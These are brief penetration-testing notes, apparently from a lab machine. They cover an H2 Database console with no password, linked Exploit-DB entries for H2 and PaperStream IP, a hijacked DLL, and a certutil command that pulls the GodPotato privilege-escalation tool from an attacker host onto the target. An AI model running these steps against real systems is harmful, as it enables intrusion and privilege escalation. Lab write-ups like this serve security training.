
- Default credential is none, just pressing connect connect the H2 Database.
- Then the exploit below can be used
https://www.exploit-db.com/exploits/49384
- Used certutil to transfer files 
```cmd
certutil.exe -urlcache -split -f http://192.168.45.213/GodPotato/GodPotato-NET4.exe C:\\Users\\tony\\g.exe
```
- Found a vulnerability in the app PaperStream IP and created a dll for 32 bit architecture.
https://www.exploit-db.com/exploits/49382
- Added System variables
```cmd
set PATH=%PATH%C:\Windows\System32;C:\Windows\System32\WindowsPowerShell\v1.0;
```

